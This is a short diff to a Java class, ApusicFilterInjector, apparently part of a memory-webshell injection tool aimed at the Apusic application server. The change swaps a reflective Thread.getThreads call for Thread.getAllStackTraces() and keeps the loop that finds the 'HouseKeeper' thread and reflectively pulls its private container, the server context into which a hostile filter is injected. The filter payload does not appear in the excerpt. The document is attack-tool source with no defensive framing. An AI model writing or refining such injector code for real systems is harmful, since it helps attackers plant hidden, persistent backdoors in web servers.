@@ -8,6 +8,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -46,7 +47,7 @@ public class ApusicFilterInjector {
 
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("HouseKeeper")) {
                 contexts.add(getFieldValue(getFieldValue(thread, "this$0"), "container"));
